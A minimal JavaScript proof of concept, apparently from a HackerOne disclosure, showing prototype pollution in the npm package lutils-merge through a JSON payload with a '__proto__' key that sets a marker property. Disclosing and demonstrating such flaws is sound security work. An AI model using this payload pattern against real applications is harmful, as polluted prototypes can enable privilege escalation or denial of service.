//https://hackerone.com/reports/439107
 
  const merge = require("lutils-merge");
  const payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

   

  merge({}, JSON.parse(payload));
// End of file
